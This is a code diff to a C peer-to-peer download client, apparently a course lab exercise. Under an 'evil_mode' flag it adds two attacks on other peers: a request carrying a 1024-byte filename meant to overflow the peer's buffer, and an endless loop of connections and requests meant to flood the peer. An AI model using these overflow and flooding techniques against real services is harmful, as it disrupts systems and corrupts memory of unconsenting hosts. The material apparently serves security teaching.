@@ -30,6 +30,9 @@ int evil_mode;			// nonzero iff this peer should behave badly
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
 
+// TASK 3
+#define LONGNAMESIZ 1024  // buffer overflow
+
 
 /*****************************************************************************
  * TASK STRUCTURE
@@ -532,71 +535,101 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
-	// Open disk file for the result.
-	// If the filename already exists, save the file in a name like
-	// "foo.txt~1~".  However, if there are 50 local files, don't download
-	// at all.
-	for (i = 0; i < 50; i++) {
-		if (i == 0)
 
-			// TASK 2: Prevent buffer overflow
+	// TASK 3
 
-			strncpy(t->disk_filename, t->filename, FILENAMESIZ);
+	if (evil_mode) {
 
-		else
-			sprintf(t->disk_filename, "%s~%d~", t->filename, i);
-		t->disk_fd = open(t->disk_filename,
-				  O_WRONLY | O_CREAT | O_EXCL, 0666);
-		if (t->disk_fd == -1 && errno != EEXIST) {
-			error("* Cannot open local file");
-			goto try_again;
-		} else if (t->disk_fd != -1) {
-			message("* Saving result to '%s'\n", t->disk_filename);
-			break;
+		// Method 1: Overflow peer's filename buffer
+		char *buf = malloc(LONGNAMESIZ);
+		memset(buf, 'A', LONGNAMESIZ);
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", buf);
+
+		// Method 2: Spam peer with requests
+		while (1) {
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			if (t->peer_fd == -1) {
+				error("* Cannot connect to peer: %s\n", strerror(errno));
+				break;
+			}
+			osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 		}
+
+		goto try_again;
 	}
-	if (t->disk_fd == -1) {
-		error("* Too many local files like '%s' exist already.\n\
+
+
+	else {
+
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+
+		// Open disk file for the result.
+		// If the filename already exists, save the file in a name like
+		// "foo.txt~1~".  However, if there are 50 local files, don't download
+		// at all.
+		for (i = 0; i < 50; i++) {
+			if (i == 0)
+
+
+				// TASK 2: Prevent buffer overflow
+
+				strncpy(t->disk_filename, t->filename, FILENAMESIZ);
+
+
+			else
+				sprintf(t->disk_filename, "%s~%d~", t->filename, i);
+			t->disk_fd = open(t->disk_filename,
+					  O_WRONLY | O_CREAT | O_EXCL, 0666);
+			if (t->disk_fd == -1 && errno != EEXIST) {
+				error("* Cannot open local file");
+				goto try_again;
+			} else if (t->disk_fd != -1) {
+				message("* Saving result to '%s'\n", t->disk_filename);
+				break;
+			}
+		}
+		if (t->disk_fd == -1) {
+			error("* Too many local files like '%s' exist already.\n\
 * Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
-		task_free(t);
-		return;
-	}
-
-	// Read the file into the task buffer from the peer,
-	// and write it from the task buffer onto disk.
-	while (1) {
-		int ret = read_to_taskbuf(t->peer_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Peer read error");
-			goto try_again;
-		} else if (ret == TBUF_END && t->head == t->tail)
-			/* End of file */
-			break;
-
-		ret = write_from_taskbuf(t->disk_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Disk write error");
-			goto try_again;
+			task_free(t);
+			return;
 		}
-	}
 
-	// Empty files are usually a symptom of some error.
-	if (t->total_written > 0) {
-		message("* Downloaded '%s' was %lu bytes long\n",
-			t->disk_filename, (unsigned long) t->total_written);
-		// Inform the tracker that we now have the file,
-		// and can serve it to others!  (But ignore tracker errors.)
-		if (strcmp(t->filename, t->disk_filename) == 0) {
-			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n",
-				     t->filename);
-			(void) read_tracker_response(tracker_task);
+		// Read the file into the task buffer from the peer,
+		// and write it from the task buffer onto disk.
+		while (1) {
+			int ret = read_to_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Peer read error");
+				goto try_again;
+			} else if (ret == TBUF_END && t->head == t->tail)
+				/* End of file */
+				break;
+
+			ret = write_from_taskbuf(t->disk_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Disk write error");
+				goto try_again;
+			}
 		}
-		task_free(t);
-		return;
+
+		// Empty files are usually a symptom of some error.
+		if (t->total_written > 0) {
+			message("* Downloaded '%s' was %lu bytes long\n",
+				t->disk_filename, (unsigned long) t->total_written);
+			// Inform the tracker that we now have the file,
+			// and can serve it to others!  (But ignore tracker errors.)
+			if (strcmp(t->filename, t->disk_filename) == 0) {
+				osp2p_writef(tracker_task->peer_fd, "HAVE %s\n",
+					     t->filename);
+				(void) read_tracker_response(tracker_task);
+			}
+			task_free(t);
+			return;
+		}
+		error("* Download was empty, trying next peer\n");
 	}
-	error("* Download was empty, trying next peer\n");
 
     try_again:
 	if (t->disk_filename[0])
